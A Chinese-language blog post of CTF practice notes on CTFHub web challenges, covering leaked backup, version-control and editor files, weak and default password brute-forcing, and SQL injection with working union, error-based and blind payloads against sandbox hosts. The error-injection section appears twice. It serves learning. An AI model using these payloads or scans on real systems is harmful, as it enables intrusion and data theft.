---

title: Ctfhub Study 1

date: 2024-11-08 10:00:00 +0800

categories: NetworkSecurity

tags: [network security]

pin: true

---

## ctfhub刷题笔记

### 1. motivation

​	听师兄说得刷刷ctf题目才能更好掌握知识，马上来学！学的时候刚好看到一个[大佬的刷题笔记](https://wuuconix.link/2021/08/18/ctfhub/)，除了从attacker的角度解题之外，还从编写程序的角度考虑了该漏洞是如何实现的。没办法像大佬一样去申请域名，然后建一个自己的网站，所以就基于服务器搭建了一个基于ubuntu的apache环境，来学习php，以及复现漏洞，具体的搭建方法可以[参考](http://10.2.34.87:10251/posts/Ubuntu-apache2-configuration/)。

### 2. web前置技能-Http协议（TODO）

   - 请求方式
   - 302跳转
   - Cookie
   - 基础认证
   - 响应包源代码

### 3. 信息泄漏

   - #### 目录遍历

   ![image-20241109211202721](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241109211202721.png)

   其实只需要在里面找到flag就好了，so easy～

   主要是如何php实现网页上遍历目录，那就按照规矩，去apache下实现一下吧

   其实比较简单，就在目录下新建一个文件夹b，然后里面添加.htaccess文件，通在里面写入以下内容

   ```bash
   <Files *> Options Indexes </Files>
   ```

   ![image-20241109213232232](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241109213232232.png)

   - #### phpinfo

     这题目的解法比较简单，flag藏在了phpinfo里面，直接ctrl f就可以搜出来了

     ![image-20241109213804383](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241109213804383.png)

     还是老规矩，得看看怎么实现的哈～

     好吧，我以为可以通过phpinfo()函数的输入去更改，结果不行；后面又尝试了修改'php.ini'，也不太行，所以得按照大佬的[办法](https://wuuconix.link/2021/08/18/ctfhub/#phpinfo)去做了，这里就不复现了
     
     - #### 备份文件下载
     
       - ##### 网站源码
     
       ![image-20241111222529136](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241111222529136.png)
     
       看这个题目，并且通过之前apache的学习，感觉备份文件应该在地址的/目录下，所以可以尝试用脚本撞一下哪个组合才是对的，以下是我的测试代码：
       
       ```python
       import requests
       
       a_list = ["web", "website", "backup", "back", "www", "wwwroot", "temp"]
       b_list = ["tar", "tar.gz", "zip", "rar"]
       for a in a_list:
           for b in b_list:
               url = "http://challenge-a6e7a6b7b0ef7729.sandbox.ctfhub.com:10800/" + a + "." + b
               print("test:", url)
               res = requests.get(url)
               if(res.status_code != 404):
                   print("find it!")
               else:
                   print("return 404")
       ```
     
       结果如下：
     
       ![image-20241111225509163](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241111225509163.png)
     
       所以我们可以看到 `www.zip`就是备份文件，输入进去后，直接下载了一个文件，但是！怎么这样子！
     
       ![image-20241111225642156](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241111225642156.png)
     
       百思不得其解，那到底去哪里拿呢？去上了个厕所，就知道了哈哈，可以直接输入浏览器，至于为什么，不懂，纯靠经验吧
       
       ![image-20241111225807958](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241111225807958.png)
       
       - ##### bak文件
       
         其实就是寻找index.php的备份文件，有一个很简单的办法，就是从标题入手，既然是bak文件，那后缀应该是.bak，输入/index.php.bak，结果还真是。打开下载的文件就有flag了，但是！我们不能这么简单去解决，毕竟比赛的时候可不会这么简单告诉你的，于是我们需要了解.php文件的备份后缀有哪些，以下就是我列举出来的(肯定还有，先列举这些)
       
         ```txt
         index.php.git
         index.php.svn
         index.php.swp
         index.php.bak
         index.php.bkf
         index.php.rar
         index.php.zip
         index.php.7z
         index.php.txt
         ```
       
         那么，我们可以通过web路径扫描仪[dirseach](https://github.com/maurosoria/dirsearch)来实现，进入`/dirsearch`目录下，输入命令
       
         ```bash
         python3 dirsearch.py -u http://challenge-ff6ff29ba8eee467.sandbox.ctfhub.com:10800/ -w ../php_backup.txt
         ```
       
         这就尝试出了结果，应该来说上面那题目也可以这么做，dirsearch的下载和安装可以[参考](https://beam-boop.github.io/posts/Docker,-python,-dirsearch-configuration/)
       
         ![image-20241112124815447](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241112124815447.png)

         - ##### vim缓存
         
         vim在意外退出的时候就会有缓存备份文件的出现，经过试验可以发现，文件的后缀`.swp`，以此往上类推`.swo`, `.swn`等等
         
         ![image-20241112205434253](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241112205434253.png)
         
         那么就好办了，利用之前`php_backup.txt`来进行dirsearch就可以了。诶，发现没有结果。
         
         ```bash
         python3 dirsearch.py -u http://challenge-481b0871930078bd.sandbox.ctfhub.com:10800/ -w ../php_backup.txt
         ```
         
         ![image-20241112210014293](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241112210014293.png)
         
         原来是缓存文件是.test.php.swp，而不是test.php.swp，修改php_backup.txt文件，结果如下
         
         ![image-20241112210315963](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241112210315963.png)
         
         一般的备份文件windows下打不开，那不如用curl命令直接下载到docker，然后打开看看算了。curl命令如果没有安装的话，建议先apt一下，-o实际上是--output
         
         ```bash
         apt install curl -y
         ```
         
         ```bash
         curl http://challenge-481b0871930078bd.sandbox.ctfhub.com:10800/.index.php.swp -o index.php.swp
         ```
         
         那接下来就是打开 `index.php.swp`，这是一个备份文件，那么肯定要恢复，vim读取备份文件可以用 `vim -r`，打开后就能够拿到结果啦～

         - ##### DS_Store
         
         原来DS_Store是macos的备份文件，那就直接尝试/DS_Store，能下载，接下来就是怎么打开这个问题。
         
         先用vim打开一下，尝试`vim -r`，可惜乱码，那就用cat查看，发现还真可以。
         
         ![image-20241112214030258](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241112214030258.png)
         
         直接用这串.txt文件，在浏览器打开，就能找到flag啦～

         - #### git泄漏

         首先需要了解git的原理和操作，可以参考这篇[博客](https://www.cnblogs.com/Jing-Wang/p/10991008.html)，写得挺好的
         
           - Log
         
           git 的log泄漏应该是之前添加了flag，但是后面又删除了flag。假如现在在上传项目的时候不小心把.git文件都上传上去了，那么就有可能会泄漏flag。通过这种猜测，我们来实践一下，我看网上大家用到的都是GitHack这个工具，具体的安装步骤和踩过的坑我写在这篇[博客]()
         
           有这个工具就很简单啦～，还是要掌握好各种工具的使用啊，记得要用`python2`
         
           ```bash
           python2 GitHack.py http://challenge-df89cafd90c3caf2.sandbox.ctfhub.com:10800/.git
           ```
         
           ![image-20241113200358761](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241113200358761.png)
         
           下载后再/dist目录下，进入目录，输入`ls -a`，查看所有文件，就能发现有`.git`，在之前的踩坑记录中，用的是lijiejie的GitHack，克隆后是没有`.git`，我也不知道为什么。
         
           ![image-20241113200514736](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241113200514736.png)
         
           之后呢有两个办法可以来capture the flag，先用git log查看日志
         
           ![image-20241113200835940](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241113200835940.png)
         
           1. `git diff`：比较之前的一个commit的不同；
         
              ![image-20241113201111748](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241113201111748.png)
         
           2. `git reset`: 重新回到之前的commit
         
              ![image-20241113201141712](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241113201141712.png)
         
              进入`.txt`后就可以啦～

              - Stash
           
              git stash能另外开辟一个暂存区，用来保存目前已经修改但是还有添加到暂存区的部份，它其实是一个堆栈，主要是在处理紧急情况，比如说：主分支上有bug，如果此时add后，后面如果需要重新覆盖本地，那会造成冲突，所以就可以用stash。`git stash list`可以查看目前的堆栈列表
           
              跟上一题一样，先把整个`.git`拉下来，然后
           
              ```bash
              git stash list
              ```
           
              ![image-20241114215618429](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241114215618429.png)
           
              可以看到stash暂存区里面有add flag，那就好办了～
           
              直接用`git stash pop`，这个命令的作用就是把stash暂存区里面的修改重新覆盖到主分支上
           
              ![image-20241114215833681](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241114215833681.png)
           
              可以用`git stash apply`，默认是把stash@{0}恢复到主分支，但是也可以指定其他的
           
              
              - index
           
              这题目没有什么好说的，挺简单的，主要是我不是很懂这题的意思，index是什么，搜索了一下，发现index就是索引区，也叫做暂存区，一般存放在`.git/index`目录下面，还真是。view了一下index文件，里面也有对应的txt文件名，但是git add后其实文件也是在本地目录那里，所以自然也能在目录那里查找到

           - #### svn泄漏
           
             svn也是一种版本控制。根据别人的踩坑日记，github上两个比较好用的工具svnHack和svnexpliot都没能下载.svn文件，有人在2021年提了issue给到作者，作者也没有加上，所以只能用[dvcs-ripper](https://github.com/kost/dvcs-ripper)，安装方法我就不多做介绍，github上都说得很清楚，按照教程来没有问题。
           
             首先，先扫一遍目录，看看有没有.svn或者.git文件，虽然题目有说，但是常规流程还是要走一遍吧
           
             ![image-20241115205829669](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241115205829669.png)
           
             键入以下命令，我们就可以把.svn下载到本地
           
             ```bash
             perl rip-svn.pl -v -u http://challenge-8d84dcb3b8aeb57b.sandbox.ctfhub.com:10800/.svn
             ```
           
             ![image-20241115205959974](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241115205959974.png)
           
             有了.svn文件夹后，一般来说所有的文件都会在`.svn/pristine`有一个备份，包括被删掉的文件。![image-20241115210102931](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241115210102931.png)
           
             这样子就能拿到flag啦～
           
           - #### hg泄漏
           
             可以继续用dvcs-ripper来下载`.hg`文件，下载下来后就开始找，一般来说是把flag上传，然后又undo撤回了，就会存在泄漏，那么store里面应该就有，看到了`undo`文件，cat后发现有txt文件名称，ok，输入浏览器，就可以拿到flag
           
             ![image-20241115212229318](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241115212229318.png)

### 4. 密码口令
       
  - #### 弱口令
       
    弱口令可以到网上去找，我找了2023年top前200的弱口令来进行暴力破解，幸好不需要验证码之类的，其实做过pikachu靶场的对这种题也是司空见惯，附[github链接](https://github.com/danielmiessler/SecLists/blob/master/Passwords/2023-200_most_used_passwords.txt)
  
    使用bp转包，放到Intruder，然后payload用这个就好了，40000条数据，跑一下就完成了，最后观察len的长度，就能找到啦～
       
         
       
  - #### 默认口令
       
    这道题目也是很不错，虽然有验证码，并且验证码竟然是没有过期的，哎，我尝试了一下重放攻击，发现验证码是不能多次使用，所以放弃，直接上网找默认口令，[棱角社区](https://forum.ywhack.com/password.php)，[Common-device-default-password](https://github.com/NepoloHebo/Common-device-default-password)
  
    ![image-20241117221649167](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241117221649167.png)
  
    然后就一个个试，幸好不多，就是出来啦，ps:棱角社区的帐号密码有点错误
    
### 5. SQL注入
  
  - #### 整数型注入
  
    在学习sql注入之前，得先具备数据库的基本知识，不过我感觉我之前学习的全都忘记了，只记得一些比较简单的sql语句，所以我先学了一下基本的语句以及sql注入经常会遇到的**[information_schema库](https://yuririns.github.io/2019/03/30/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0-information_schema%E5%BA%93/)**，让我们开始做题吧
  
    ![image-20241118232819863](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241118232819863.png)
  
    当输入以下命令，发现没有显示，而输入order by 1 /2 就会有显示，可以判断这个表可能就只有两个字段，判断这个的原因主要是我们肯定是要union其他表，这里有个规定，union的表必须和当前这个表的字段相同。
  
    ```sql
    1 or 1=1 order by 3
    ```
  
    ![image-20241118233200893](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241118233200893.png)
  
    接下来就是爆数据库的名称，输入
  
    ```sql
    1 and 1=2 union select database(),2
    ```
  
    ![image-20241119085417348](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119085417348.png)
  
    为什么要用 `id=1 and 1=2`，这是因为只有where后面的语句不成立，才能够输出union后面的内容，`database()`其实就是数据库的名称，为了后面用information_shcema库来爆表和字段做铺垫，这样子我们就可以知道库名叫做`sqli`。有些关于union的解释可以[参考](https://blog.csdn.net/m0_51756263/article/details/125700087)
    
    键入以下sql语句，information_schema是数据库的元数据，他其实一个视图，只能查看，不能修改，具体可以[参考](https://yuririns.github.io/2019/03/30/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0-information_schema%E5%BA%93/)，下面就是爆表了，查看数据库`sqli`中有多少张表
    
    ```sql
    1 and 1=2 union select group_concat(table_name),2 from information_schema.tables where table_schema='sqli'
    ```
    ![image-20241119090915454](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119091353651.png)
  
    爆表后就是爆字段，发现flag表后还有flag字段
    
    ```sql
    1 and 1=2 union select group_concat(column_name),2 from information_schema.columns where table_name='flag'
    ```
    ![image-20241119091425489](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119091425489.png)
    
    ```sql
    id=1 and 1=2 union select flag,2 from flag
    ```
  - #### 字符型注入
    
    先输入一个1看看，发现现在用的是字符型，那么就需要用到#以及'来进行注释和封闭
    
    ![image-20241119093018281](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119093018281.png)
    
    爆库
    
    ```sql
    1' and 1=2 union select database(),2#
    ```
    
    ![image-20241119093247111](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119093247111.png)
    
    爆表
    
    ```sql
    1' and 1=2 union select group_concat(table_name),2 from information_schema.tables where table_schema='sqli'#
    ```
    
    爆字段
    
    ```sql
    1' and 1=2 union select group_concat(column_name),2 from information_schema.columns where table_name='flag'#
    ```
    
    ![image-20241119093854717](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119093854717.png)
    
    查数据
    
    ```sql
    1' and 1=2 union select flag,2 from flag#
    ```
    
    ![image-20241119094030945](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241119094030945.png)

        - #### 报错注入
    
      有两种办法😌进行报错注入
    
      1. `extractvalue()`，`extractvalue()`函数用于查询XML文档中的数据，如果提供的XPath表达式不符合XML规范，将导致SQL执行错误，并返回错误信息，其中包含了非法格式的内容。这个特性可以被用来执行SQL注入攻击，通过构造特定的查询语句来获取数据库信息；接受两个参数：第一个参数是XML文档对象的名称（`XML_document`），第二个参数是XPath格式的字符串（`XPath_string`），用于指定需要提取的XML部分
      2. `updatexml()`， 函数的作用是改变文档中符合条件的节点的值。如果 XPath 表达式无效，数据库会返回错误信息，错误信息中可能包含数据库版本、用户名、表名、列名等敏感信息，这使得 `updatexml()` 函数在 SQL 注入攻击中被利用；接受三个参数：
         - **xml_target**：这是第一个参数，表示需要操作的 XML 片段，它是一个字符串类型的参
         - **xpath_expr**：这是第二个参数，表示需要更新的 XML 路径，使用 XPath 格式。如果这个参数的格式不正确，MySQL 会返回一个错误信息，这可以被利用来进行 SQL 注入攻击。
         - **new_xml**：这是第三个参数，表示更新后的内容，它也是一个字符串类型的参数。
    
      利用extractvalue()来进行
    
      ```sql
      1 and (select extractvalue(1, concat(0x7e, database())))
      ```
    
      ![image-20241121203531765](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121203531765.png)
    
      ```sql
      1 and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli'))))
      ```
    
      ![image-20241121204115262](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121204115262.png)
    
      ```sql
      1 and (select extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag'))))
      ```
    
      ```sql
      1 and (select extractvalue (1, concat(0x7e, (select flag from flag))))
      ```
    
      ![image-20241121204535173](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121204535173.png)
    
      ```sql
      1 and (select updatexml(1,concat(0x7e, database()),1))
      ```
    
      ![image-20241121204856373](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121204856373.png)
    
      ```sql
      1 and (select updatexml(1,(concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli'))),1))
      ```
    
      ```sql
      1 and (select updatexml(1,(concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag'))),1))
      ```
    
      ```sql
      1 and (select updatexml (1, concat(0x7e, (select flag from flag)),1))	
      ```
    
      其实最后的拿到flag只有一部份，幸好知识加个右中括号就可以搞定，但是如果缺少字母得怎么办，其实可以用right去获取右边的字符
    
      ```sql
      1 and (select updatexml (1, concat(0x7e, (select right(flag,3) from flag)),1))	
      ```

  - #### 报错注入
  
    有两种办法😌进行报错注入
  
    1. `extractvalue()`，`extractvalue()`函数用于查询XML文档中的数据，如果提供的XPath表达式不符合XML规范，将导致SQL执行错误，并返回错误信息，其中包含了非法格式的内容。这个特性可以被用来执行SQL注入攻击，通过构造特定的查询语句来获取数据库信息；接受两个参数：第一个参数是XML文档对象的名称（`XML_document`），第二个参数是XPath格式的字符串（`XPath_string`），用于指定需要提取的XML部分
    2. `updatexml()`， 函数的作用是改变文档中符合条件的节点的值。如果 XPath 表达式无效，数据库会返回错误信息，错误信息中可能包含数据库版本、用户名、表名、列名等敏感信息，这使得 `updatexml()` 函数在 SQL 注入攻击中被利用；接受三个参数：
        - **xml_target**：这是第一个参数，表示需要操作的 XML 片段，它是一个字符串类型的参
        - **xpath_expr**：这是第二个参数，表示需要更新的 XML 路径，使用 XPath 格式。如果这个参数的格式不正确，MySQL 会返回一个错误信息，这可以被利用来进行 SQL 注入攻击。
        - **new_xml**：这是第三个参数，表示更新后的内容，它也是一个字符串类型的参数。
  
    利用extractvalue()来进行
  
    ```sql
    1 and (select extractvalue(1, concat(0x7e, database())))
    ```
  
    ![image-20241121203531765](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121203531765.png)
  
    ```sql
    1 and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli'))))
    ```
  
    ![image-20241121204115262](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121204115262.png)
  
    ```sql
    1 and (select extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag'))))
    ```
  
    ```sql
    1 and (select extractvalue (1, concat(0x7e, (select flag from flag))))
    ```
  
    ![image-20241121204535173](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121204535173.png)
  
    ```sql
    1 and (select updatexml(1,concat(0x7e, database()),1))
    ```
  
    ![image-20241121204856373](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20241121204856373.png)
  
    ```sql
    1 and (select updatexml(1,(concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli'))),1))
    ```
  
    ```sql
    1 and (select updatexml(1,(concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag'))),1))
    ```
  
    ```sql
    1 and (select updatexml (1, concat(0x7e, (select flag from flag)),1))	
    ```
  
    其实最后的拿到flag只有一部份，幸好知识加个右中括号就可以搞定，但是如果缺少字母得怎么办，其实可以用right去获取右边的字符
  
    ```sql
    1 and (select updatexml (1, concat(0x7e, (select right(flag,3) from flag)),1))	
    ```
  - #### 布尔注入

  怎么理解布尔注入呢？其实就是每一次查询，后台只会返回查询成功或者失败，那么就得写个脚本，自动化地去猜，猜数据库的长度，名称，数据表的个数，长度和名称，字段的个数，长度和名称以及字段的内容等等，看了别人的脚本后，把他的github代码fork到自己的仓库一份[🔗](https://github.com/Beam-boop/SQL-Blind-Injection-Auto)，其实代码中最重要的还是sql查询语句，比如acsii,substr,length来实现查询。

  为什么要用length很好理解吧，那为啥要用ascii码呢？因为在sql语句中，没有“a==a”或者其他这种字母的判断方式，所以最好就是用ascii('xxx') = ascii('yyy')，其中yyy就是我们的猜测，如果猜中了，那么用chr(yyy)拼接进去就好了，在猜的过程中，可以用二分的办法，可以提高效率；substr使用的原因也不用多说，主要是参数问题，一半有三个参数(str,pos,len)。

- #### 时间注入

![image-20250120171534912](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250120171534912.png)

输入后竟然什么都不返回，那这个应该怎么做呢，只能看看网上的writeup了。布尔注入是会有一个返回结果，告知是正确还是错误的，但是时间注入不一样，没有返回结果，他什么信息都不给你，这就是所谓的无回显。所以需要自己手动构造一个success_flag出来，这就用到了sql的if函数

```sql
if(1=1,1,sleep(2))
```

如果条件判断为真，那么直接返回1，如果为假，那么需要等待2ms再返回，那么就可以利用这个返回的时间，来判断是否正确，只需要

```python
requests.get(url, headers=headers, timeout=1).text
```

所以，我们可以通过是否有异常来判断。